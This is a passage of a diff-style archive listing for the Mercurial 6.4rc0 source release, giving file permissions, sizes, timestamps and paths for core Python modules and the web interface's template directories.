+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27443 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/sparse.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23001 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/sshpeer.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    36608 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/sslutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      722 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/stack.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12263 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/state.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8014 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/statichttprepo.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    32685 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/statprof.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25586 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/store.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    31570 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/streamclone.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9010 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/strip.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    75401 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/subrepo.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17665 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/subrepoutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11518 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/tagmerge.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30294 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/tags.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15534 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templatefilters.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30822 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templatefuncs.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    34854 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templatekw.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    39070 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templater.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.222632 mercurial-6.4rc0/mercurial/templates/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/__init__.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.222632 mercurial-6.4rc0/mercurial/templates/atom/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      321 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/bookmarkentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      372 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/bookmarks.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      315 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/branchentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      367 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/branches.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      282 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/changelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1350 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/changelogentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      484 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/error.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      265 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/filelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       86 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/header.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      563 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/map
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      306 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/tagentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      353 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/atom/tags.tmpl
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.222632 mercurial-6.4rc0/mercurial/templates/coal/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/coal/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      549 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/coal/header.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       45 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/coal/map
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.222632 mercurial-6.4rc0/mercurial/templates/gitweb/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1238 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/bookmarks.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1231 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/branches.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1276 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/changelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      489 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/changelogentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2260 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/changeset.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1290 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/error.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2967 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/fileannotate.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2706 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/filecomparison.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2223 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/filediff.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2109 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/filelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2813 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/filerevision.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      227 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/footer.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2394 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/graph.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      320 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/graphentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      527 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/header.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1181 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/help.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1645 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/helptopics.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      664 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/index.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1372 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/manifest.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17122 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/map
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      397 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/notfound.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1279 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/search.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1914 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/shortlog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2487 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/summary.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1208 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/gitweb/tags.tmpl
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.222632 mercurial-6.4rc0/mercurial/templates/json/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/json/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      124 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/json/changelist.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      117 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/json/graph.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6809 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/json/map
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      864 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/map-cmdline.bisect
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      854 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/map-cmdline.changelog
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1018 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/map-cmdline.compact
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3619 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/map-cmdline.default
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      263 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/map-cmdline.phases
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1106 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/map-cmdline.show
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      972 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/map-cmdline.status
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1624 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/map-cmdline.xml
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.226632 mercurial-6.4rc0/mercurial/templates/monoblue/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1465 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/bookmarks.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1457 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/branches.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1526 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/changelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      467 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/changelogentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2622 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/changeset.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1499 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/error.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2962 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/fileannotate.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3034 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/filecomparison.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2545 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/filediff.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2177 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/filelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2984 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/filerevision.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      486 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/footer.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2591 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/graph.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      371 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/graphentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      495 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/header.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1406 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/help.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1951 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/helptopics.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      945 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/index.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1700 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/manifest.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14563 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/map
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1657 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/notfound.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1487 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/search.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2112 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/shortlog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2854 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/summary.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1430 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/monoblue/tags.tmpl
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.226632 mercurial-6.4rc0/mercurial/templates/paper/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1447 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/bookmarks.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1440 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/branches.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2638 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/changeset.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      341 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/diffstat.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1005 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/error.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2882 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/fileannotate.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2702 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/filecomparison.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2422 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/filediff.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3124 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/filelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      333 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/filelogentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2769 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/filerevision.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       24 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/footer.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2806 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/graph.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      309 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/graphentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      458 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/header.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      920 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/help.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1311 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/helptopics.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      795 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/index.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1460 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/manifest.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11838 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/map
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      262 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/notfound.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1721 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/search.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2679 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/shortlog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      258 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/shortlogentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1407 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/paper/tags.tmpl
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.226632 mercurial-6.4rc0/mercurial/templates/raw/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       67 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/changelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      124 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/changeset.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       24 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/error.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       44 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/fileannotate.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       27 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/filediff.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       76 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/graph.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       70 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/graphedge.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      240 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/graphnode.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       30 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/index.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      172 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/logentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       58 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/manifest.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1183 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/map
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       44 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/notfound.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      111 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/raw/search.tmpl
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.226632 mercurial-6.4rc0/mercurial/templates/rss/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      228 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/bookmarkentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      163 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/bookmarks.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      224 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/branchentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      158 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/branches.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      155 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/changelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1534 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/changelogentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      241 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/error.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      174 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/filelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      315 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/filelogentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      149 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/header.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      530 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/map
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      218 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/tagentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      153 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/rss/tags.tmpl
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.226632 mercurial-6.4rc0/mercurial/templates/spartan/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1044 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/branches.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1537 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/changelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      973 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/changelogentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1764 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/changeset.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      174 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/error.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1712 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/fileannotate.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1342 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/filediff.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1415 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/filelog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      877 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/filelogentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1647 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/filerevision.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      162 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/footer.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1688 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/graph.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      320 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/graphentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      389 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/header.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      472 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/index.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      944 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/manifest.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9608 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/map
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      262 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/notfound.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      946 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/search.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1540 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/shortlog.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      281 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/shortlogentry.tmpl
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1017 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/spartan/tags.tmpl
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.226632 mercurial-6.4rc0/mercurial/templates/static/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      603 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/background.png
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      273 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/coal-file.png
